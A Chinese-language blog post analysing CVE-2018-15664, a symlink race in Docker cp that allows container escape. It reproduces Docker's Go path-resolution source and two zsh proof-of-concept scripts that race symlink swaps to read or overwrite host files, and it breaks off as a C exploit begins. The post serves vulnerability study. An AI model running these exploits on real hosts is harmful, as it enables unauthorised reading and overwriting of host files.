<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Sally"><title>CVE-2018-15664 利用符号链接容器逃逸 · Sally's Blog</title><meta name="description" content="影响版本Docker &amp;lt;&amp;#x3D; 18.06.1-ce-rc2
Docker cpDocker cp命令能够将容器内的文件向宿主机复制，也能够实现宿主机文件向容器中复制。
12# 将容器中的文件复制到宿主机中docker cp container_id:file_path_in_conta"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.webp"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">主页</a></li><li> <a href="/archives">归档</a></li><li> <a href="/tags">标签</a></li><li> <a href="/about">关于</a></li><li> <a href="/links">友链</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/kabi.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/kabi.jpg" style="width:220px;" alt="favicon"><h3 title=""><a href="/">Sally's Blog</a></h3><div class="description"><p>A simple and beautiful blog</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/phoenixmerk"><i class="fa fa-github"></i></a></li><li><a href="mailto:yourname@example.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://zhihu.com/people/jin-xin-4-68"><i class="fa fa-mortar-board"></i></a></li></ul><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="220" height="86" src="//music.163.com/outchain/player?type=2&amp;id=1293913379&amp;auto=1&amp;height=66&amp;&amp;loop=1"></iframe></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> Sally</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>CVE-2018-15664 利用符号链接容器逃逸</a></h3></div><div class="post-content"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-Sally-blue.svg"></a></p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Docker &lt;&#x3D; 18.06.1-ce-rc2</p>
<h2 id="Docker-cp"><a href="#Docker-cp" class="headerlink" title="Docker cp"></a>Docker cp</h2><p>Docker cp命令能够将容器内的文件向宿主机复制，也能够实现宿主机文件向容器中复制。</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将容器中的文件复制到宿主机中</span></span><br><span class="line">docker cp container_id:file_path_in_container host_path</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20230912113020582.png"></p>
<h2 id="符号链接"><a href="#符号链接" class="headerlink" title="符号链接"></a>符号链接</h2><p>类似于Windows中的快捷方式。符号链接的操作是透明的：对符号链接文件进行读写的程序会表现得直接对目标文件进行操作。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将目标路径和指定的链接名或者路径进行绑定</span></span><br><span class="line"><span class="built_in">ln</span> -s targrt_path link_path</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20230912114240358.png" alt="image-20230912114240358"></p>
<h2 id="源码及利用原理"><a href="#源码及利用原理" class="headerlink" title="源码及利用原理"></a>源码及利用原理</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copyright 2012 The Go Authors. All rights reserved.</span></span><br><span class="line"><span class="comment">// Use of this source code is governed by a BSD-style</span></span><br><span class="line"><span class="comment">// license that can be found in the LICENSE.BSD file.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// This code is a modified version of path/filepath/symlink.go from the Go standard library.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> symlink</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;errors&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/docker/docker/pkg/system&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// FollowSymlinkInScope is a wrapper around evalSymlinksInScope that returns an</span></span><br><span class="line"><span class="comment">// absolute path. This function handles paths in a platform-agnostic manner.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">FollowSymlinkInScope</span><span class="params">(path, root <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	path, err := filepath.Abs(filepath.FromSlash(path))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	root, err = filepath.Abs(filepath.FromSlash(root))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> evalSymlinksInScope(path, root)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// evalSymlinksInScope will evaluate symlinks in `path` within a scope `root` and return</span></span><br><span class="line"><span class="comment">// a result guaranteed to be contained within the scope `root`, at the time of the call.</span></span><br><span class="line"><span class="comment">// Symlinks in `root` are not evaluated and left as-is.</span></span><br><span class="line"><span class="comment">// Errors encountered while attempting to evaluate symlinks in path will be returned.</span></span><br><span class="line"><span class="comment">// Non-existing paths are valid and do not constitute an error.</span></span><br><span class="line"><span class="comment">// `path` has to contain `root` as a prefix, or else an error will be returned.</span></span><br><span class="line"><span class="comment">// Trying to break out from `root` does not constitute an error.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Example:</span></span><br><span class="line"><span class="comment">//   If /foo/bar -&gt; /outside,</span></span><br><span class="line"><span class="comment">//   FollowSymlinkInScope(&quot;/foo/bar&quot;, &quot;/foo&quot;) == &quot;/foo/outside&quot; instead of &quot;/oustide&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// IMPORTANT: it is the caller&#x27;s responsibility to call evalSymlinksInScope *after* relevant symlinks</span></span><br><span class="line"><span class="comment">// are created and not to create subsequently, additional symlinks that could potentially make a</span></span><br><span class="line"><span class="comment">// previously-safe path, unsafe. Example: if /foo/bar does not exist, evalSymlinksInScope(&quot;/foo/bar&quot;, &quot;/foo&quot;)</span></span><br><span class="line"><span class="comment">// would return &quot;/foo/bar&quot;. If one makes /foo/bar a symlink to /baz subsequently, then &quot;/foo/bar&quot; should</span></span><br><span class="line"><span class="comment">// no longer be considered safely contained in &quot;/foo&quot;.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">evalSymlinksInScope</span><span class="params">(path, root <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	root = filepath.Clean(root)</span><br><span class="line">	<span class="keyword">if</span> path == root &#123;</span><br><span class="line">		<span class="keyword">return</span> path, <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> !strings.HasPrefix(path, root) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;evalSymlinksInScope: &quot;</span> + path + <span class="string">&quot; is not in &quot;</span> + root)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">const</span> maxIter = <span class="number">255</span></span><br><span class="line">	originalPath := path</span><br><span class="line">	<span class="comment">// given root of &quot;/a&quot; and path of &quot;/a/b/../../c&quot; we want path to be &quot;/b/../../c&quot;</span></span><br><span class="line">	path = path[<span class="built_in">len</span>(root):]</span><br><span class="line">	<span class="keyword">if</span> root == <span class="type">string</span>(filepath.Separator) &#123;</span><br><span class="line">		path = <span class="type">string</span>(filepath.Separator) + path</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> !strings.HasPrefix(path, <span class="type">string</span>(filepath.Separator)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;evalSymlinksInScope: &quot;</span> + path + <span class="string">&quot; is not in &quot;</span> + root)</span><br><span class="line">	&#125;</span><br><span class="line">	path = filepath.Clean(path)</span><br><span class="line">	<span class="comment">// consume path by taking each frontmost path element,</span></span><br><span class="line">	<span class="comment">// expanding it if it&#x27;s a symlink, and appending it to b</span></span><br><span class="line">	<span class="keyword">var</span> b bytes.Buffer</span><br><span class="line">	<span class="comment">// b here will always be considered to be the &quot;current absolute path inside</span></span><br><span class="line">	<span class="comment">// root&quot; when we append paths to it, we also append a slash and use</span></span><br><span class="line">	<span class="comment">// filepath.Clean after the loop to trim the trailing slash</span></span><br><span class="line">	<span class="keyword">for</span> n := <span class="number">0</span>; path != <span class="string">&quot;&quot;</span>; n++ &#123;</span><br><span class="line">		<span class="keyword">if</span> n &gt; maxIter &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;evalSymlinksInScope: too many links in &quot;</span> + originalPath)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// find next path component, p</span></span><br><span class="line">		i := strings.IndexRune(path, filepath.Separator)</span><br><span class="line">		<span class="keyword">var</span> p <span class="type">string</span></span><br><span class="line">		<span class="keyword">if</span> i == <span class="number">-1</span> &#123;</span><br><span class="line">			p, path = path, <span class="string">&quot;&quot;</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			p, path = path[:i], path[i+<span class="number">1</span>:]</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> p == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// this takes a b.String() like &quot;b/../&quot; and a p like &quot;c&quot; and turns it</span></span><br><span class="line">		<span class="comment">// into &quot;/b/../c&quot; which then gets filepath.Cleaned into &quot;/c&quot; and then</span></span><br><span class="line">		<span class="comment">// root gets prepended and we Clean again (to remove any trailing slash</span></span><br><span class="line">		<span class="comment">// if the first Clean gave us just &quot;/&quot;)</span></span><br><span class="line">		cleanP := filepath.Clean(<span class="type">string</span>(filepath.Separator) + b.String() + p)</span><br><span class="line">		<span class="keyword">if</span> cleanP == <span class="type">string</span>(filepath.Separator) &#123;</span><br><span class="line">			<span class="comment">// never Lstat &quot;/&quot; itself</span></span><br><span class="line">			b.Reset()</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">		fullP := filepath.Clean(root + cleanP)</span><br><span class="line"></span><br><span class="line">		fi, err := os.Lstat(fullP)</span><br><span class="line">		<span class="keyword">if</span> os.IsNotExist(err) &#123;</span><br><span class="line">			<span class="comment">// if p does not exist, accept it</span></span><br><span class="line">			b.WriteString(p)</span><br><span class="line">			b.WriteRune(filepath.Separator)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> fi.Mode()&amp;os.ModeSymlink == <span class="number">0</span> &#123;</span><br><span class="line">			b.WriteString(p + <span class="type">string</span>(filepath.Separator))</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// it&#x27;s a symlink, put it at the front of path</span></span><br><span class="line">		dest, err := os.Readlink(fullP)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> system.IsAbs(dest) &#123;</span><br><span class="line">			b.Reset()</span><br><span class="line">		&#125;</span><br><span class="line">		path = dest + <span class="type">string</span>(filepath.Separator) + path</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// see note above on &quot;fullP := ...&quot; for why this is double-cleaned and</span></span><br><span class="line">	<span class="comment">// what&#x27;s happening here</span></span><br><span class="line">	<span class="keyword">return</span> filepath.Clean(root + filepath.Clean(<span class="type">string</span>(filepath.Separator)+b.String())), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// EvalSymlinks returns the path name after the evaluation of any symbolic</span></span><br><span class="line"><span class="comment">// links.</span></span><br><span class="line"><span class="comment">// If path is relative the result will be relative to the current directory,</span></span><br><span class="line"><span class="comment">// unless one of the components is an absolute symbolic link.</span></span><br><span class="line"><span class="comment">// This version has been updated to support long paths prepended with `\\?\`.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">EvalSymlinks</span><span class="params">(path <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> evalSymlinks(path)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Docker cp过程中FolllowSyslinkInScope方法会先检测路径合法存在，检测结束后evalSymlinkInScope方法对路径进行解析并执行后续文件复制操作。</p>
<p>整个复制过程不是一个原子操作，而<strong>路径检测</strong>和<strong>解析执行</strong>才分别是原子操作。在这个复制过程中如果攻击者在路径检测结束后将正常路径替换成一个恶意的符号链接，那么攻击者将能够对Docker cp的目的主机（可以是容器也可以是宿主机）任意路径的文件内容进行覆盖。</p>
<p>然而这里我也有个猜测，Docker cp相当于一个<strong>set-uid进程</strong>，于是它可以获得文件root权限进行文件内容覆盖。</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20230912134832774.png" alt="image-20230912134832774"></p>
<h2 id="漏洞场景和POC解读"><a href="#漏洞场景和POC解读" class="headerlink" title="漏洞场景和POC解读"></a>漏洞场景和POC解读</h2><h3 id="漏洞场景：受害者在从容器中复制文件到宿主机"><a href="#漏洞场景：受害者在从容器中复制文件到宿主机" class="headerlink" title="漏洞场景：受害者在从容器中复制文件到宿主机"></a>漏洞场景：受害者在从容器中复制文件到宿主机</h3><p>当漏洞触发时容器内的文件将被复制到宿主机中的任意一个目录（恶意符号链接所指定）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/zsh</span></span><br><span class="line"><span class="comment"># Copyright (C) 2018 Aleksa Sarai &lt;asarai@suse.de&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This program is free software: you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment"># it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment"># the Free Software Foundation, either version 3 of the License, or</span></span><br><span class="line"><span class="comment"># (at your option) any later version.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment"># but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment"># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment"># GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="comment"># along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span></span><br><span class="line"></span><br><span class="line">SYMSWAP_PATH=/totally_safe_path</span><br><span class="line">SYMSWAP_TARGET=/w00t_w00t_im_a_flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create our flag.</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;SUCCESS -- COPIED FROM THE HOST&quot;</span> | sudo <span class="built_in">tee</span> <span class="string">&quot;<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span><br><span class="line">sudo <span class="built_in">chmod</span> 000 <span class="string">&quot;<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Run and build the malicious image.</span></span><br><span class="line">docker build -t cyphar/symlink_swap \</span><br><span class="line">	--build-arg <span class="string">&quot;SYMSWAP_PATH=<span class="variable">$SYMSWAP_PATH</span>&quot;</span> \</span><br><span class="line">	--build-arg <span class="string">&quot;SYMSWAP_TARGET=<span class="variable">$SYMSWAP_TARGET</span>&quot;</span> build/</span><br><span class="line">ctr_id=$(docker run --<span class="built_in">rm</span> -d cyphar/symlink_swap <span class="string">&quot;<span class="variable">$SYMSWAP_PATH</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now continually try to copy the files.</span></span><br><span class="line">idx=0</span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">mkdir</span> <span class="string">&quot;ex<span class="variable">$&#123;idx&#125;</span>&quot;</span></span><br><span class="line">	docker <span class="built_in">cp</span> <span class="string">&quot;<span class="variable">$&#123;ctr_id&#125;</span>:<span class="variable">$SYMSWAP_PATH</span>/<span class="variable">$SYMSWAP_TARGET</span>&quot;</span> <span class="string">&quot;ex<span class="variable">$&#123;idx&#125;</span>/out&quot;</span></span><br><span class="line">	idx=$((<span class="variable">$idx</span> + <span class="number">1</span>))</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h3 id="漏洞场景：受害者在从宿主机中复制文件到容器中"><a href="#漏洞场景：受害者在从宿主机中复制文件到容器中" class="headerlink" title="漏洞场景：受害者在从宿主机中复制文件到容器中"></a>漏洞场景：受害者在从宿主机中复制文件到容器中</h3><p>当漏洞触发时宿主机内的文件将被复制到宿主机中的任意一个目录（容器中恶意符号链接所指定）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/zsh</span></span><br><span class="line"><span class="comment"># Copyright (C) 2018 Aleksa Sarai &lt;asarai@suse.de&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This program is free software: you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment"># it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment"># the Free Software Foundation, either version 3 of the License, or</span></span><br><span class="line"><span class="comment"># (at your option) any later version.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment"># but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment"># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment"># GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="comment"># along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span></span><br><span class="line"></span><br><span class="line">SYMSWAP_PATH=/totally_safe_path</span><br><span class="line">SYMSWAP_TARGET=/w00t_w00t_im_a_flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create our flag.</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;FAILED -- HOST FILE UNCHANGED&quot;</span> | sudo <span class="built_in">tee</span> <span class="string">&quot;<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span><br><span class="line">sudo <span class="built_in">chmod</span> 0444 <span class="string">&quot;<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Run and build the malicious image.</span></span><br><span class="line">docker build -t cyphar/symlink_swap \</span><br><span class="line">	--build-arg <span class="string">&quot;SYMSWAP_PATH=<span class="variable">$SYMSWAP_PATH</span>&quot;</span> \</span><br><span class="line">	--build-arg <span class="string">&quot;SYMSWAP_TARGET=<span class="variable">$SYMSWAP_TARGET</span>&quot;</span> build/</span><br><span class="line">ctr_id=$(docker run --<span class="built_in">rm</span> -d cyphar/symlink_swap <span class="string">&quot;<span class="variable">$SYMSWAP_PATH</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;SUCCESS -- HOST FILE CHANGED&quot;</span> | <span class="built_in">tee</span> localpath</span><br><span class="line"></span><br><span class="line"><span class="comment"># Now continually try to copy the files.</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	docker <span class="built_in">cp</span> localpath <span class="string">&quot;<span class="variable">$&#123;ctr_id&#125;</span>:<span class="variable">$SYMSWAP_PATH</span>/<span class="variable">$SYMSWAP_TARGET</span>&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<h3 id="POC解读"><a href="#POC解读" class="headerlink" title="POC解读"></a>POC解读</h3><p>POC中使用一个无限循环将恶意符号链接与正常文件交换，根据目标文件内容可以判定我们是否竞争成功。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (C) 2018 Aleksa Sarai &lt;asarai@suse.de&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This program is free software: you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment"> * it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment"> * the Free Software Foundation, either version 3 of the License, or</span></span><br><span class="line"><span class="comment"> * (at your option) any later version.</span></span><br><span class="line"><span class="comment"> 